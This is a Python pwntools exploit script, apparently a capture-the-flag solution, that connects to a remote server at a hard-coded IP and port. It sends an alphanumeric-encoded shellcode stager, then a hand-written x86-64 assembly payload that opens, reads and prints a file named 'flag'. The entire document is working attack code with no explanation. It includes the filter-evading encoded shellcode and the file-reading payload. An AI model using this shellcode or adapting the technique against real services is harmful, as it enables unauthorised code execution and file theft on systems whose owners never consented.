#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('8.130.35.16', 58002)

sh.sendafter(b'shellcode: ', b'jBZPPPf1Tt0XXXXXXX' + b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G122o5L162v1n3Z4s3f173p4I3c1o3c353d1L062G4N06060q05184r4L000n020b0z5L3m2I004r113Y1N8N3R1O3r3Y3b17401N051M8N3n1M4M3k114u8O0E5o0q8M3F0b')
sh.recvuntil(b'0')

shellcode = asm(
'''
jmp start

read:
    mov r15, rdx
    xor edx, edx
    inc edx
read_again:
    xor eax, eax
    syscall
    inc rsi
    dec r15
    test r15, r15
    jnz read_again
ret

write:
    mov r15, rdx
    xor edx, edx
    inc edx
write_again:
    xor eax, eax
    inc eax
    syscall
    inc rsi
    dec r15
    test r15, r15
    jnz write_again
ret

start:
    xor edi, edi
    mov eax, 3
    syscall

    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    call write

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    call read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    call write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit

''')

sh.send(shellcode.ljust(0x400, b'\xcc'))

sh.interactive()

